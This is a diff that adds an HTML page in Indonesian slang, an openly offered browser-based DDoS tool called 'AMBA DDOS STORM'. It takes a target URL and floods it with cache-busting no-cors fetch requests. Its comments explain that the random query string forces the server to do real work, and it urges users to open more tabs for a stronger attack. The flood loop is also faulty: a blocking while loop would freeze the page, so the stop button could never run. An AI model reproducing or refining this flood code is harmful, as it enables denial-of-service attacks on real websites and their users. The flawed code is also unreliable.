@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <title>AMBA-DDOS-STORM 2090</title>
+    <style>
+        body { background: #000; color: #00ff00; font-family: 'Courier New', monospace; text-align: center; padding: 20px; }
+        .box { border: 2px solid #00ff00; padding: 20px; display: inline-block; box-shadow: 0 0 20px #00ff00; border-radius: 10px; width: 80%; max-width: 600px; }
+        input { width: 80%; padding: 10px; margin: 10px 0; background: #111; border: 1px solid #00ff00; color: #00ff00; }
+        button { padding: 15px 30px; font-weight: bold; cursor: pointer; border: none; border-radius: 5px; margin: 5px; }
+        .btn-start { background: #ff0000; color: white; }
+        .btn-stop { background: #555; color: white; }
+        #status { margin-top: 20px; color: yellow; font-size: 14px; text-align: left; height: 150px; overflow-y: scroll; border: 1px solid #333; padding: 10px; }
+    </style>
+</head>
+<body>
+
+<div class="box">
+    <h1>🌪️ AMBA DDOS STORM 2090 🌪️</h1>
+    <p>TARGET URL (Pake http:// atau https://):</p>
+    <input type="text" id="targetURL" placeholder="https://contoh-web-target.com">
+    <br>
+    <button class="btn-start" onclick="startStorm()">LAUNCH ATTACK</button>
+    <button class="btn-stop" onclick="stopStorm()">ABORT MISSION</button>
+
+    <div id="status">READY TO FIRE, MAS AMBA...</div>
+    <p style="font-size: 10px; color: #ff0055; margin-top: 10px;">[WARNING]: SEMAKIN BANYAK TAB DIBUKA, SERANGAN SEMAKIN KUAT.</p>
+</div>
+
+<script>
+    let storming = false;
+    let requestCount = 0;
+
+    function startStorm() {
+        const target = document.getElementById('targetURL').value;
+        if (!target) return alert("Masukin linknya dulu, Mas Amba!");
+        
+        storming = true;
+        document.getElementById('status').innerHTML = "[SYSTEM]: ATTACK STARTED ON " + target + "<br>";
+        
+        // Loop serangan
+        while (storming) {
+            flood(target);
+        }
+    }
+
+    async function flood(url) {
+        if (!storming) return;
+
+        // Trik bypass cache biar server target bener-bener dipaksa kerja
+        const rand = "?amba=" + Math.random();
+        
+        fetch(url + rand, { mode: 'no-cors' }).then(() => {
+            requestCount++;
+            let log = document.getElementById('status');
+            log.innerHTML += "[SENT]: Request #" + requestCount + " to target...<br>";
+            log.scrollTop = log.scrollHeight;
+        }).catch(() => {
+            // Tetap hit biarpun error
+        });
+
+        // Delay super kecil biar browser gak crash total tapi request tetep deres
+        await new Promise(r => setTimeout(r, 1));
+    }
+
+    function stopStorm() {
+        storming = false;
+        document.getElementById('status').innerHTML += "<br>[SYSTEM]: ATTACK ABORTED. TOTAL SENT: " + requestCount;
+    }
+</script>
+
+<p style="margin-top: 50px; color: #444; font-size: 10px;">Ambatukam GGUF - DDoS Module V1.0</p>
+
+</body>
+</html>
